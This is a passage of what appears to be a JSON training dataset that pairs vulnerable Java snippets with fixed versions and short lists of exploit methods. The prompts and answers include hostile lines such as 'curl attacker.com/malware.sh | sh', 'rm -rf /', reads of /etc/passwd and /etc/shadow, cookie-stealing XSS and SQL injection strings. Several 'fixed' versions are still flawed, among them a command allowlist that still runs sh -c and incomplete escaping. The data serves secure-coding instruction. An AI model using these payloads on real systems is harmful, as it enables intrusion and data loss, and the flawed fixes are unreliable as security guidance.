os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import javax.servlet.http.HttpServlet;\\nimport javax.servlet.http.HttpServletRequest;\\nimport javax.servlet.http.HttpServletResponse;\\n\\npublic class TransferServlet extends HttpServlet {\\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) {\\n        String account = request.getParameter(\\\"account\\\");\\n        String amount = request.getParameter(\\\"amount\\\");\\n        \\n        // Simulate a bank transfer operation\\n        if (account != null && amount != null) {\\n            // Transfer logic here...\\n            response.getWriter().println(\\\"Transfer of \\\" + amount + \\\" to account \\\" + account + \\\" completed successfully.\\\");\\n        }\\n    }\\n}",
      "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
      "cvss_score": 8.6,
      "fixed_code": "import javax.servlet.http.HttpServlet;\\nimport javax.servlet.http.HttpServletRequest;\\nimport javax.servlet.http.HttpServletResponse;\\nimport java.util.UUID;\\n\\npublic class TransferServlet extends HttpServlet {\\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\\n        String csrfToken = UUID.randomUUID().toString();\\n        request.getSession().setAttribute(\\\"csrfToken\\\", csrfToken);\\n        // Render a form with the token in a hidden field\\n        response.getWriter().println(\\\"<form action='transfer' method='post'>\\n\\\" +\\n            \\\"    <input type='hidden' name='csrfToken' value='\\\" + csrfToken + \\\"'>\\n\\\" +\\n            \\\"    Account: <input type='text' name='account'><br>\\n\\\" +\\n            \\\"    Amount: <input type='text' name='amount'><br>\\n\\\" +\\n            \\\"    <input type='submit' value='Transfer'>\\n</form>\\\");\\n    }\\n\\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) {\\n        String sessionToken = (String) request.getSession().getAttribute(\\\"csrfToken\\\");\\n        String requestToken = request.getParameter(\\\"csrfToken\\\");\\n        if (!sessionToken.equals(requestToken)) {\\n            response.setStatus(HttpServletResponse.SC_FORBIDDEN);\\n            return;\\n        }\\n\\n        String account = request.getParameter(\\\"account\\\");\\n        String amount = request.getParameter(\\\"amount\\\");\\n        \\n        // Simulate a bank transfer operation\\n        if (account != null && amount != null) {\\n            // Transfer logic here...\\n            response.getWriter().println(\\\"Transfer of \\\" + amount + \\\" to account \\\" + account + \\\" completed successfully.\\\");\\n        }\\n    }\\n}",
      "exploit_ways": [
        "An attacker can trick a logged-in user into visiting a malicious site that submits a POST request to the transfer endpoint.",
        "Using social engineering, an attacker can convince the user to click a link that performs a malicious action on their behalf.",
        "An attacker can craft a form that auto-submits in the background using JavaScript to execute unauthorized transfers."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Cross-Site Scripting (XSS)\n- Vulnerable Code: import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class XSSExampleServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        response.getWriter().println(\"<html><body><h1>\" + userInput + \"</h1></body></html>\");\n    }\n}\n- CVSS Score: 6.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import javax.servlet.http.HttpServlet;\\nimport javax.servlet.http.HttpServletRequest;\\nimport javax.servlet.http.HttpServletResponse;\\nimport java.io.IOException;\\n\\npublic class XSSExampleServlet extends HttpServlet {\\n    @Override\\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\\n        String userInput = request.getParameter(\\\"input\\\");\\n        response.getWriter().println(\\\"<html><body><h1>\\\" + userInput + \\\"</h1></body></html>\\\");\\n    }\\n}",
      "vulnerability_type": "Cross-Site Scripting (XSS)",
      "cvss_score": 6.5,
      "fixed_code": "import javax.servlet.http.HttpServlet;\\nimport javax.servlet.http.HttpServletRequest;\\nimport javax.servlet.http.HttpServletResponse;\\nimport java.io.IOException;\\n\\npublic class XSSExampleServlet extends HttpServlet {\\n    @Override\\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\\n        String userInput = request.getParameter(\\\"input\\\");\\n        String safeInput = escapeHtml(userInput);\\n        response.getWriter().println(\\\"<html><body><h1>\\\" + safeInput + \\\"</h1></body></html>\\\");\\n    }\\n\\n    private String escapeHtml(String input) {\\n        if (input == null) return null;\\n        return input.replace(\\\"&\\\", \\\"&amp;\\\")\\n                    .replace(\\\\\"<\\\\\", \\\\\"&lt;\\\\\")\\n                    .replace(\\\\\">\\\\\", \\\\\"&gt;\\\\\")\\n                    .replace(\\\\\"\\\\\\\"\\\\\", \\\\\"&quot;\\\\\")\\n                    .replace(\\\\\"'\\\\\", \\\"&#x27;\\\");\\n    }\\n}",
      "exploit_ways": [
        "An attacker could inject a script like <script>alert('XSS')</script> to execute arbitrary JavaScript.",
        "They can use <img src=x onerror=alert(document.cookie)> to steal cookies or other sensitive data.",
        "By injecting <iframe src=malicious.com></iframe>, an attacker can load malicious content into the victim's browser."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Privilege Escalation\n- Vulnerable Code: public class VulnerableClass {\\n    public void executeCommand(String command) throws Exception {\\n        ProcessBuilder pb = new ProcessBuilder();\\n        String os = System.getProperty(\"os.name\").toLowerCase();\\n        if (os.contains(\"win\")) {\\n            pb.command(\"cmd.exe\", \"/c\", command);\\n        } else {\\n            pb.command(\"sh\", \"-c\", command);\\n        }\\n        Process process = pb.start();\\n        process.waitFor();\\n    }\\n}\n- CVSS Score: 8.2\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "public class VulnerableClass {\\n    public void executeCommand(String command) throws Exception {\\n        ProcessBuilder pb = new ProcessBuilder();\\n        String os = System.getProperty(\\\"os.name\\\").toLowerCase();\\n        if (os.contains(\\\"win\\\")) {\\n            pb.command(\\\"cmd.exe\\\", \\\"/c\\\", command);\\n        } else {\\n            pb.command(\\\"sh\\\", \\\"-c\\\", command);\\n        }\\n        Process process = pb.start();\\n        process.waitFor();\\n    }\\n}",
      "vulnerability_type": "Privilege Escalation",
      "cvss_score": 8.2,
      "fixed_code": "public class SecureClass {\\n    public void executeCommand(String command) throws Exception {\\n        String[] allowedCommands = {\\\"ls\\\", \\\"whoami\\\"};\\n        boolean isAllowed = false;\\n        for (String cmd : allowedCommands) {\\n            if (cmd.equals(command)) {\\n                isAllowed = true;\\n                break;\\n            }\\n        }\\n        if (isAllowed) {\\n            ProcessBuilder pb = new ProcessBuilder();\\n            String os = System.getProperty(\\\"os.name\\\").toLowerCase();\\n            if (os.contains(\\\"win\\\")) {\\n                pb.command(\\\"cmd.exe\\\", \\\"/c\\\", command);\\n            } else {\\n                pb.command(\\\"sh\\\", \\\"-c\\\", command);\\n            }\\n            Process process = pb.start();\\n            process.waitFor();\\n        } else {\\n            throw new IllegalArgumentException(\\\"Command not allowed\\\");\\n        }\\n    }\\n}",
      "exploit_ways": [
        "An attacker can input 'sudo rm -rf /' to delete all files on the system.",
        "They can use 'whoami; cat /etc/shadow' to attempt to leak sensitive information.",
        "Exploiting with 'curl http://attacker.com/malware.sh | sh' can lead to remote code execution."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Path Traversal\n- Vulnerable Code: import java.io.File;\nimport java.io.FileReader;\npublic class FileReadExample {\n    public void readFile(String fileName) {\n        try {\n            File file = new File(fileName);\n            FileReader fr = new FileReader(file);\n            int i;\n            while ((i=fr.read()) != -1)\n                System.out.print((char) i);\n            fr.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n- CVSS Score: 7.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import java.io.File;\\nimport java.io.FileReader;\\npublic class FileReadExample {\\n    public void readFile(String fileName) {\\n        try {\\n            File file = new File(fileName);\\n            FileReader fr = new FileReader(file);\\n            int i;\\n            while ((i=fr.read()) != -1)\\n                System.out.print((char) i);\\n            fr.close();\\n        } catch (Exception e) {\\n            e.printStackTrace();\\n        }\\n    }\\n}",
      "vulnerability_type": "Path Traversal",
      "cvss_score": 7.5,
      "fixed_code": "import java.io.File;\\nimport java.nio.file.Paths;\\nimport java.io.FileReader;\\npublic class FileReadExample {\\n    private static final String BASE_DIR = \\\"/safe/directory\\\";\\n    public void readFile(String fileName) {\\n        try {\\n            File file = Paths.get(BASE_DIR, fileName).toFile();\\n            if (!file.toPath().startsWith(Paths.get(BASE_DIR))) {\\n                throw new SecurityException(\\\"Access Denied\\\");\\n            }\\n            FileReader fr = new FileReader(file);\\n            int i;\\n            while ((i=fr.read()) != -1)\\n                System.out.print((char) i);\\n            fr.close();\\n        } catch (Exception e) {\\n            e.printStackTrace();\\n        }\\n    }\\n}",
      "exploit_ways": [
        "An attacker could input \"../etc/passwd\" to read the system's password file.",
        "By using path traversal, they might access sensitive application configuration files like database credentials.",
        "Accessing log files through paths such as \"../../logs/application.log\" can lead to leakage of sensitive information."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Command Injection\n- Vulnerable Code: import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nclass UnsafeClass {\n    public static void main(String[] args) throws Exception {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n        String command = reader.readLine();\n        Runtime.getRuntime().exec(command);\n    }\n}\n- CVSS Score: 8.2\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import java.io.BufferedReader;\\nimport java.io.InputStreamReader;\\nclass UnsafeClass {\\n    public static void main(String[] args) throws Exception {\\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\\n        String command = reader.readLine();\\n        Runtime.getRuntime().exec(command);\\n    }\\n}",
      "vulnerability_type": "Command Injection",
      "cvss_score": 8.2,
      "fixed_code": "import java.io.BufferedReader;\\nimport java.io.InputStreamReader;\\nclass SafeClass {\\n    public static void main(String[] args) throws Exception {\\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\\n        String command = reader.readLine();\\n        if (command.equals(\\\"allowed_command\\\")) {\\n            Runtime.getRuntime().exec(command);\\n        } else {\\n            System.out.println(\\\"Command not allowed\\\");\\n        }\\n    }\\n}",
      "exploit_ways": [
        "User could input 'rm -rf /' to delete system files.",
        "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
        "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Cross-Site Scripting (XSS)\n- Vulnerable Code: public void printMessage(String userInput) {\n    System.out.println(\"User Input: \" + userInput);\n}\n- CVSS Score: 4.3\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "public void printMessage(String userInput) {\\n    System.out.println(\\\"User Input: \\\" + userInput);\\n}",
      "vulnerability_type": "Cross-Site Scripting (XSS)",
      "cvss_score": 4.3,
      "fixed_code": "import org.owasp.encoder.Encode;\\n\\npublic void printMessage(String userInput) {\\n    String safeInput = Encode.forHtml(userInput);\\n    System.out.println(\\\"User Input: \\\" + safeInput);\\n}",
      "exploit_ways": [
        "An attacker can inject script tags to execute arbitrary JavaScript in the context of a user's browser.",
        "They could use event handlers like 'onload' or 'onclick' to steal cookies or session tokens from other users.",
        "Injecting malicious scripts could redirect users to phishing sites designed to harvest sensitive information."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: SQL Injection\n- Vulnerable Code: import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\nimport java.sql.Statement;\n\npublic class VulnerableDB {\n    private Connection connect() {\n        String url = \"jdbc:sqlite:sample.db\";\n        Connection conn = null;\n        try {\n            conn = DriverManager.getConnection(url);\n        } catch (SQLException e) {\n            System.out.println(e.getMessage());\n        }\n        return conn;\n    }\n\n    public void query(String username) {\n        String sql = \"SELECT * FROM users WHERE name = '\" + username + \"'\";\n        try (Connection conn = this.connect();\n             Statement stmt = conn.createStatement();\n             ResultSet rs = stmt.executeQuery(sql)) {\n            while (rs.next()) {\n                System.out.println(rs.getInt(\"id\") +  \"\\t\" + \n                                   rs.getString(\"name\") + \"\\t\" +\n                                   rs.getString(\"email\"));\n            }\n        } catch (SQLException e) {\n            System.out.println(e.getMessage());\n        }\n    }\n}\n- CVSS Score: 8.2\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import java.sql.Connection;\\nimport java.sql.DriverManager;\\nimport java.sql.ResultSet;\\nimport java.sql.SQLException;\\nimport java.sql.Statement;\\n\\npublic class VulnerableDB {\\n    private Connection connect() {\\n        String url = \\\"jdbc:sqlite:sample.db\\\";\\n        Connection conn = null;\\n        try {\\n            conn = DriverManager.getConnection(url);\\n        } catch (SQLException e) {\\n            System.out.println(e.getMessage());\\n        }\\n        return conn;\\n    }\\n\\n    public void query(String username) {\\n        String sql = \\\"SELECT * FROM users WHERE name = '\\\" + username + \\\"'\\\";\\n        try (Connection conn = this.connect();\\n             Statement stmt = conn.createStatement();\\n             ResultSet rs = stmt.executeQuery(sql)) {\\n            while (rs.next()) {\\n                System.out.println(rs.getInt(\\\"id\\\") +  \\\"\\t\\\" + \\n                                   rs.getString(\\\"name\\\") + \\\"\\t\\\" +\\n                                   rs.getString(\\\"email\\\"));\\n            }\\n        } catch (SQLException e) {\\n            System.out.println(e.getMessage());\\n        }\\n    }\\n}",
      "vulnerability_type": "SQL Injection",
      "cvss_score": 8.2,
      "fixed_code": "import java.sql.Connection;\\nimport java.sql.DriverManager;\\nimport java.sql.PreparedStatement;\\nimport java.sql.ResultSet;\\nimport java.sql.SQLException;\\n\\npublic class SecureDB {\\n    private Connection connect() {\\n        String url = \\\"jdbc:sqlite:sample.db\\\";\\n        Connection conn = null;\\n        try {\\n            conn = DriverManager.getConnection(url);\\n        } catch (SQLException e) {\\n            System.out.println(e.getMessage());\\n        }\\n        return conn;\\n    }\\n\\n    public void query(String username) {\\n        String sql = \\\"SELECT * FROM users WHERE name = ?\\\";\\n        try (Connection conn = this.connect();\\n             PreparedStatement pstmt = conn.prepareStatement(sql)) {\\n            pstmt.setString(1, username);\\n            ResultSet rs = pstmt.executeQuery();\\n            while (rs.next()) {\\n                System.out.println(rs.getInt(\\\"id\\\") +  \\\"\\t\\\" + \\n                                   rs.getString(\\\"name\\\") + \\\"\\t\\\" +\\n                                   rs.getString(\\\"email\\\"));\\n            }\\n        } catch (SQLException e) {\\n            System.out.println(e.getMessage());\\n        }\\n    }\\n}",
      "exploit_ways": [
        "An attacker could input 'admin' OR '1'='1' to retrieve all user records.",
        "They can use SQL injection to extract data from other tables, such as ' UNION SELECT username, password FROM admin --'.",
        "An attacker might try to cause a denial of service by injecting a large query or using a sleep function like ' OR 1=0 WAITFOR DELAY '0:00:30'"
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Race Condition (Difficult to Exploit)\n- Vulnerable Code: public class RaceCondition {\n    private static int counter = 0;\n\n    public static void increment() {\n        for (int i = 0; i < 1000; i++) {\n            counter++;\n        }\n    }\n\n    public static void main(String[] args) throws InterruptedException {\n        Thread t1 = new Thread(() -> increment());\n        Thread t2 = new Thread(() -> increment());\n\n        t1.start();\n        t2.start();\n\n        t1.join();\n        t2.join();\n\n        System.out.println(\"Counter: \" + counter);\n    }\n}\n- CVSS Score: 4.3\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "public class RaceCondition {\\n    private static int counter = 0;\\n\\n    public static void increment() {\\n        for (int i = 0; i < 1000; i++) {\\n            counter++;\\n        }\\n    }\\n\\n    public static void main(String[] args) throws InterruptedException {\\n        Thread t1 = new Thread(() -> increment());\\n        Thread t2 = new Thread(() -> increment());\\n\\n        t1.start();\\n        t2.start();\\n\\n        t1.join();\\n        t2.join();\\n\\n        System.out.println(\\\"Counter: \\\" + counter);\\n    }\\n}",
      "vulnerability_type": "Race Condition (Difficult to Exploit)",
      "cvss_score": 4.3,
      "fixed_code": "public class RaceCondition {\\n    private static int counter = 0;\\n    private static final Object lock = new Object();\\n\\n    public static void increment() {\\n        synchronized (lock) {\\n            for (int i = 0; i < 1000; i++) {\\n                counter++;\\n            }\\n        }\\n    }\\n\\n    public static void main(String[] args) throws InterruptedException {\\n        Thread t1 = new Thread(() -> increment());\\n        Thread t2 = new Thread(() -> increment());\\n\\n        t1.start();\\n        t2.start();\\n\\n        t1.join();\\n        t2.join();\\n\\n        System.out.println(\\\"Counter: \\\" + counter);\\n    }\\n}",
      "exploit_ways": [
        "An attacker could manipulate the timing of thread execution to consistently result in a lower final count.",
        "In a larger application, this race condition could lead to inconsistent state updates, causing unexpected behavior or security flaws.",
        "By creating many threads, an attacker might cause a denial-of-service condition if the system runs out of resources due to excessive contention."
      ]
    }
  },
  {
    "instruction": "\nGiven the following inputs:\n- Vulnerability Type: Missing Security Headers\n- Vulnerable Code: import javax.servlet.http.HttpServletResponse;\npublic class VulnerableServlet {\n    public void setHeaders(HttpServletResponse response) {\n        // No security headers are being set\n    }\n}\n- CVSS Score: 6.1\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n",
    "output": {
      "vulnerability_code": "import javax.servlet.http.HttpServletResponse;\\npublic class VulnerableServlet {\\n    public void setHeaders(HttpServletResponse response) {\\n        // No security headers are being set\\n    }\\n}",
      "vulnerability_type": "Missing Security Headers",
      "cvss_score": 6.1,
      "fixed_code": "import javax.servlet.http.HttpServletResponse;\\npublic class SecureServlet {\\n    public void setHeaders(HttpServletResponse response) {\\n        response.setHeader(\\\"Content-Security-Policy\\\", \\\"default-src 'self'\\\");\\n        response.setHeader(\\\"X-Frame-Options\\\", \\\"SAMEORIGIN\\\");\\n        response.setHeader(\\\"X-XSS-Protection\\\", \\\"1; mode=block\\\");\\n        response.setHeader(\\\"Strict-Transport-Security\\\", \\\"max-age=31536000; includeSubDomains\\\");\\n        response.setHeader(\\\"X-Content-Type-Options\\\", \\\"nosniff\\\");\\n    }\\n}",
      "exploit_ways": [
        "Attackers can inject malicious scripts into the application due to lack of Content Security Policy.",
        "Clickjacking attacks are possible as X-Frame-Options header is not set.",
        "Cross-Site Scripting (XSS) attacks may succeed because X-XSS-Protection is not enabled."
      ]
    }
  },
  {
